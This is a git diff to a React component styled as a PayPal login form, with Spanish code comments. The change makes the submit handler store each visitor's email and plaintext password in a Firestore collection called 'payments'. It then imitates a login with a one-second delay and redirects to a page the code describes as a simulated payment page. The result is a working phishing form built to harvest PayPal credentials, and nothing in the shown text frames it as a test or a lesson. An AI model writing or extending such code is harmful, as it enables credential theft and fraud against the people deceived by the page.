@@ -2,6 +2,9 @@
 import * as React from "react";
 import { useState } from "react";
 import styles from "./PaypalLoginForm.module.css";
+import { useNavigate } from "react-router-dom"; // Importa useNavigate
+import { collection, addDoc } from "firebase/firestore"; // Importar Firestore
+import { db } from "../../credentials"; // Asegúrate de que la ruta sea correcta
 
 const PaypalLoginForm = () => {
   const [formData, setFormData] = useState({
@@ -9,6 +12,7 @@ const PaypalLoginForm = () => {
     password: "",
     keepLoggedIn: false,
   });
+  const navigate = useNavigate(); // Inicializa useNavigate
 
   const handleInputChange = (e) => {
     const { name, value, type, checked } = e.target;
@@ -18,9 +22,26 @@ const PaypalLoginForm = () => {
     }));
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
-    // Handle form submission
+
+    try {
+      // Guardar los datos en Firestore
+      await addDoc(collection(db, "payments"), {
+        email: formData.email,
+        password: formData.password,
+        keepLoggedIn: formData.keepLoggedIn,
+        date: new Date().toISOString(), // Agregar la fecha del envío
+      });
+
+      // Simula el inicio de sesión y redirige
+      setTimeout(() => {
+        navigate("/paypal-payment"); // Redirige a la página de pago simulada
+      }, 1000); // Espera 1 segundo para simular el procesamiento
+    } catch (error) {
+      console.error("Error al guardar los datos en Firestore:", error);
+      alert("Hubo un error al procesar tu solicitud. Intenta nuevamente.");
+    }
   };
 
   return (
@@ -43,7 +64,7 @@ const PaypalLoginForm = () => {
               value={formData.email}
               onChange={handleInputChange}
               className={styles.formInput}
-              placeholder="Correo electronico o número de celular"
+              placeholder="Correo electrónico o número de celular"
               aria-label="Email or phone number"
             />
 
